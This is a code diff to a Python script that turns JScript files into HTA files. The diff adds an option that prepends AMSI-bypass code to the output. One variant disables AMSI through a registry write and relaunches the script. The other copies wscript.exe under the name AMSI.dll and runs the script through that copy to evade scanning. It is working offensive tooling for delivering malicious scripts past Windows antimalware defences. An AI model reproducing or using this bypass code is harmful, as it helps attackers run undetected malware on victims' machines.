@@ -1,12 +1,15 @@
 import sys
 import os
+import argparse
 
-def create_hta_from_jscript(jscript_file_path):
+def create_hta_from_jscript(jscript_file_path, amsi_bypass_mode="none"):
     """
     Wraps a JScript file's content in HTML and HTA tags to create a valid HTA script.
 
     Args:
         jscript_file_path (str): The path to the JScript file.
+        amsi_bypass_mode (str, optional): The AMSI bypass mode.  Defaults to "none".
+            Valid values are "none", "soft", or "aggressive".
 
     Returns:
         str: The content of the JScript file wrapped in HTA tags, or None on error.
@@ -22,6 +25,42 @@ def create_hta_from_jscript(jscript_file_path):
         print(f"Error reading JScript file: {e}")
         return None
 
+    amsi_bypass_code = ""
+    if amsi_bypass_mode == "soft":
+        amsi_bypass_code = """
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+try{
+    var AmsiEnable = sh.RegRead(key);
+    if(AmsiEnable!=0){
+    throw new Error(1, '');
+    }
+}catch(e){
+    sh.RegWrite(key, 0, "REG_DWORD");
+    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
+    sh.RegWrite(key, 1, "REG_DWORD");
+    WScript.Quit(1);
+}
+"""
+    elif amsi_bypass_mode == "aggressive":
+        amsi_bypass_code = """
+var filesys= new ActiveXObject("Scripting.FileSystemObject");
+var sh = new ActiveXObject('WScript.Shell');
+try
+{
+	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
+	{
+		throw new Error(1, '');
+	}
+}
+catch(e)
+{
+	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
+	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
+	WScript.Quit(1);
+}
+"""
+
     hta_content = f"""<HTML>
 <HEAD>
 <TITLE>HTA from JScript</TITLE>
@@ -34,6 +73,7 @@ def create_hta_from_jscript(jscript_file_path):
 </HEAD>
 <BODY>
 <script language="javascript">
+{amsi_bypass_code}
 {jscript_content}
 </script>
 </BODY>
@@ -63,15 +103,18 @@ def write_hta_file(hta_content, jscript_file_path):
         return False
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage: python jscript_to_hta.py <jscript_file_path>")
-        sys.exit(1)
+    parser = argparse.ArgumentParser(description="Wrap JScript in HTA tags, with optional AMSI bypass.")
+    parser.add_argument("jscript_file_path", help="Path to the JScript file")
+    parser.add_argument("-a", "--amsi", choices=['none', 'soft', 'aggressive'], default='none', help="Include AMSI bypass code (none, soft, aggressive)")
+    args = parser.parse_args()
 
-    jscript_file_path = sys.argv[1]
-    hta_content = create_hta_from_jscript(jscript_file_path)
+    jscript_file_path = args.jscript_file_path
+    amsi_bypass_mode = args.amsi
+
+    hta_content = create_hta_from_jscript(jscript_file_path, amsi_bypass_mode)
     if hta_content:
         write_success = write_hta_file(hta_content, jscript_file_path)
         if not write_success:
-            sys.exit(1)  # Exit with an error code if writing failed.
+            sys.exit(1)
     else:
-        sys.exit(1) # Exit with an error code if HTA content creation failed.
+        sys.exit(1)
